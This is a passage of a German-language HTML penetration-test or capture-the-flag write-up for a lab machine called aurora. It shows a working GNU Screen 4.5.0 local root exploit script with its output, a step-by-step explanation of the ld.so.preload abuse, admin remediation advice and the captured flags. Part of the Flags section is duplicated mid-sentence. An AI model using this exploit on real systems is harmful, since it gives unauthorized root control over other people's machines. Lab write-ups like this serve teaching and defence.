+gcc -o /tmp/rootshell /tmp/rootshell.c
+rm -f /tmp/rootshell.c
+echo "[+] Now we create our /etc/ld.so.preload file..."
+cd /etc
+umask 000 # because
+screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
+echo "[+] Triggering..."
+screen -ls # screen itself is setuid, so...
+/tmp/rootshell
+                      </pre>
+                      <!-- Exploit ausführen -->
+                      <div class="prompt no-kali-prompt">doro@aurora:/tmp$ <span class="command">chmod +x exploit.sh</span></div>
+                      <div class="prompt no-kali-prompt">doro@aurora:/tmp$ <span class="command">./exploit.sh</span></div>
+                      <pre>
+~ gnu/screenroot ~
+[+] First, we create our shell and library...
+/tmp/libhax.c: In function ‘dropshell’:
+/tmp/libhax.c:7:5: warning: implicit declaration of function ‘chmod’ [-Wimplicit-function-declaration]
+    7 |     chmod("/tmp/rootshell", 04755);
+      |     ^~~~~
+/tmp/rootshell.c: In function ‘main’:
+/tmp/rootshell.c:3:5: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
+    3 |     setuid(0);
+      |     ^~~~~~
+# ... (weitere Compiler-Warnungen) ...
+[+] Now we create our /etc/ld.so.preload file...
+[+] Triggering...
+' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+[+] done!
+No Sockets found in /tmp/screens/S-doro.
+                      </pre>
+                      <!-- Root Shell wird gestartet -->
+                      <div class="prompt root-prompt"># <span class="command">id</span></div>
+                      <pre>uid=0(root) gid=0(root) groups=0(root),1000(doro)</pre>
+                  </div>
+              </div>
+        </section>
+
+        <section id="poc"> <!-- POC Sektion beginnt hier -->
+            <h2>Proof of Concept (Screen Exploit - CVE-2017-5229)</h2>
+            <p class="analysis">
+                <strong>Kurzbeschreibung:</strong> Dieser Proof of Concept beschreibt die Ausnutzung einer lokalen Privilege Escalation Schwachstelle in GNU Screen Version 4.5.0 (CVE-2017-5229). Die Schwachstelle erlaubt es einem lokalen Benutzer, durch Manipulation der `/etc/ld.so.preload`-Datei mittels einer Funktion von `screen`, beim nächsten Aufruf eines SUID-Binaries (wie `screen` selbst) eigenen Code als `root` auszuführen.
+            </p>
+             <p class="evaluation">
+                 <strong>Voraussetzungen:</strong>
+                 *   Lokaler Zugriff als Benutzer `doro`.
+                 *   `/usr/bin/screen` muss SUID-Root gesetzt haben und Version 4.5.0 sein.
+                 *   Ein C-Compiler (`gcc`) muss auf dem System verfügbar sein.
+                 *   Schreibrechte in `/tmp`.
+             </p>
+            <p class="analysis">
+                <strong>Schritte zur Ausnutzung:</strong>
+                1.  **Payload-Vorbereitung:** Es werden zwei C-Dateien erstellt und kompiliert:
+                    *   `libhax.c`: Eine Shared Library, die beim Laden (`__attribute__ ((__constructor__))`) `/tmp/rootshell` dem Benutzer `root` zuweist (`chown`) und das SUID-Bit setzt (`chmod 04755`). Sie entfernt außerdem `/etc/ld.so.preload`, um Endlosschleifen zu vermeiden. Kompiliert zu `/tmp/libhax.so`.
+                    *   `rootshell.c`: Ein einfaches Programm, das `setuid(0)`, `setgid(0)` usw. aufruft und dann eine Shell (`/bin/sh`) startet. Kompiliert zu `/tmp/rootshell`.
+                2.  **ld.so.preload Manipulation:**
+                    *   `cd /etc`: Wechsel in das `/etc`-Verzeichnis (wo `ld.so.preload` liegt).
+                    *   `umask 000`: Setzt die umask, um sicherzustellen, dass die erstellte Datei schreibbar ist.
+                    *   `screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"`: Nutzt eine Funktion von `screen` (`-L` loggt in eine Datei, `-D -m` startet im detached Modus), um den Pfad zur bösartigen Bibliothek (`/tmp/libhax.so`, mit einem führenden Newline `\x0a`) in die Datei `/etc/ld.so.preload` zu schreiben. Da `screen` SUID ist, geschieht dies mit Root-Rechten.
+                3.  **Triggering:**
+                    *   `screen -ls`: Ruft `screen` erneut auf. Da `screen` SUID ist und `/etc/ld.so.preload` nun auf `/tmp/libhax.so` zeigt, wird die Bibliothek `/tmp/libhax.so` vom dynamischen Lader mit Root-Rechten geladen, *bevor* `screen` selbst startet.
+                    *   Die `dropshell`-Funktion in `libhax.so` wird ausgeführt: `/tmp/rootshell` wird SUID-Root. `/etc/ld.so.preload` wird gelöscht.
+                4.  **Root-Shell starten:**
+                    *   `/tmp/rootshell`: Das nun SUID-Root gesetzte Programm wird ausgeführt. Es setzt die UIDs/GIDs auf 0 und startet eine `/bin/sh`-Shell.
+            </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Der Exploit wurde erfolgreich ausgeführt. Die Compiler-Warnungen sind harmlos. Der Fehler "cannot be preloaded" ist Teil des normalen Ablaufs, da die Datei `/etc/ld.so.preload` erstellt wird, während der `screen -ls`-Prozess schon läuft. Die `id`-Ausgabe bestätigt den erfolgreichen Erhalt einer Root-Shell (`uid=0(root)`).
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Root-Zugriff erlangt. Suchen Sie die Root-Flag.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> **Höchste Priorität:** Aktualisieren Sie die `screen`-Version oder entfernen Sie das SUID-Bit. Überwachen Sie die Integrität von `/etc/ld.so.preload`.
+             </p>
+              <p class="evaluation">
+                  <strong>Risikobewertung:</strong> Die Ausnutzung einer bekannten lokalen Privilege Escalation Schwachstelle in einem SUID-Binary ermöglichte die vollständige Übernahme des Systems von einem unprivilegierten Benutzer (`doro`) aus. Das Risiko ist **hoch** bis **kritisch**, abhängig von den Berechtigungen des initialen Benutzers.
+              </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt no-kali-prompt">doro@aurora:/tmp$ <span class="command"># (exploit.sh wurde zuvor erstellt und ausführbar gemacht)</span></div>
+                     <div class="prompt no-kali-prompt">doro@aurora:/tmp$ <span class="command">./exploit.sh</span></div>
+                     <pre>
+~ gnu/screenroot ~
+[+] First, we create our shell and library...
+# ... (Compiler-Warnungen) ...
+[+] Now we create our /etc/ld.so.preload file...
+[+] Triggering...
+' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
+[+] done!
+No Sockets found in /tmp/screens/S-doro.
+                     </pre>
+                     <!-- Root-Shell wird gestartet -->
+                     <div class="prompt root-prompt"># <span class="command">id</span></div>
+                     <pre>uid=0(root) gid=0(root) groups=0(root),1000(doro)</pre>
+                 </div>
+             </div>
+        </section> <!-- POC Sektion endet hier -->
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <p class="analysis">
+                     <strong>Analyse:</strong> Die User-Flag wurde im                  <h2 class="flag-heading">Flags</h2>
+                 <p class="analysis">
+                     <strong>Analyse:</strong> Die User-Flag wurde im Home-Verzeichnis von `doro` (`/home/doro/user.txt`) gefunden, nachdem die Rechte dieses Benutzers durch Command Injection erlangt wurden. Die Root-Flag wurde im Verzeichnis `/root/root.txt` gefunden, nachdem Root-Rechte durch Ausnutzung der Screen-Schwachstelle erlangt wurden.
+                 </p>
+                 <p class="evaluation">
+                     <strong>Bewertung:</strong> Beide Flags wurden erfolgreich extrahiert.
+                 </p>
+                 <!-- Formatierte Flags -->
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/doro/user.txt</div>
+                     <div class="flag-value"><span class="password">ccd839df5504a7ace407b5aeca436e81</span></div>
+                 </div>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <div class="flag-value"><span class="password">052cf26a6e7e33790391c0d869e2e40c</span></div>
+                 </div>
+             </div>
+         </section>
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 2023-05-03</p> <!-- Datum eingefügt -->
+    </footer>
+</body>
+</html>
